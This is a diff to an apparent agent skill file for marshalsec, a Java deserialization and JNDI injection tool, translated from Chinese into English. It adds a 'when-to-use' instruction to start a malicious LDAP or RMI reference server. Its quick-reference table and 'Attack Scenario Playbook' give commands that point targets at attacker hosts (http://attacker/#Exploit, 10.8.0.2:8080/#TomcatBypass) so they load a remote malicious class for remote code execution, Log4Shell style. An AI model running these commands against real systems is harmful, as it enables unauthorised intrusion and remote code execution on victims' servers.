@@ -2,37 +2,40 @@
 name: marshalsec-deser
 description: "marshalsec: JNDI injection exploitation infrastructure. Signals: pwn, binary exploitation, malicious LDAP, RMI service, codebase URL."
 zh-signals: "marshalsec: JNDI 注入利用基础设施。信号:pwn,二进制利用,恶意 LDAP,RMI 服务,codebase URL。"
+when-to-use: >-
+  Use when exploiting a JNDI lookup or Java deserialization sink; start a malicious LDAP or RMI
+  reference server that serves the remote class payload to the target.
 ---
 
 # marshalsec
 
-- 攻击大类:C46 二进制漏洞利用与Pwn
-- 上游仓库:https://github.com/mbechler/marshalsec
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C46 Binary Exploitation and Pwn
+- Upstream Repository: https://github.com/mbechler/marshalsec
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/mbechler/marshalsec && mvn clean package -DskipTests
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker/#Exploit 1389` | 恶意 LDAP |
-| `marshalsec.jndi.RMIRefServer` | RMI 服务 |
+| `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker/#Exploit 1389` | Malicious LDAP |
+| `marshalsec.jndi.RMIRefServer` | RMI service |
 | `--codebase` | codebase URL |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### JNDI 注入利用基础设施
+### JNDI Injection Exploitation Infrastructure
 
 ```bash
 java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://10.8.0.2:8080/#TomcatBypass 1389
-# 目标 JNDI lookup 指向本机 → 加载远程恶意类 → RCE(Log4Shell 同理)
+# Target JNDI lookup points to our host → loads the remote malicious class → RCE (same as Log4Shell)
 ```
 
-## 注意事项
+## Notes
 
-Java 反序列化/JNDI 攻击瑞士刀;Log4Shell 时代的基础设施标配。
+A Swiss Army knife for Java deserialization/JNDI attacks; a standard piece of infrastructure since Log4Shell.
